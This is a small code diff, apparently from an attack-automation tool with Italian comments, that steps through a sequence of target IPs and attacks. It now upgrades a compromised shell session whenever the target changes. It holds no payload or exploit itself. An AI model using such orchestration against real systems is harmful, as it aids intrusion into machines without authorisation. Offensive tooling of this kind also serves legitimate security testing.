@@ -112,12 +112,16 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
         attack_sequence = sequence_loader.load_attack_sequence(attack_sequence_file)
         sequence_loader.print_attack_sequence(attack_sequence_file)
 
-        # Itera direttamente su ogni step della sequenza di attacco
+        previous_ip = None
+
+        # Itera su ogni step della sequenza di attacco
         for i, (attack_name, target_ip, other_attribute) in enumerate(attack_sequence, start=1):
             print(f"{C.COL_GREEN}[STEP {i}] Attacking IP: {target_ip} with {attack_name}{C.COL_RESET}")
             
-            #if atk_sess:
-                #met_sess = mc.upgrade_shell(atk_sess)
+            if target_ip != previous_ip and atk_sess:
+                met_sess = mc.upgrade_shell(atk_sess)
+
+            previous_ip = target_ip
 
             # Gestione di una subnet diversa
             if target_ip in other_subnet:
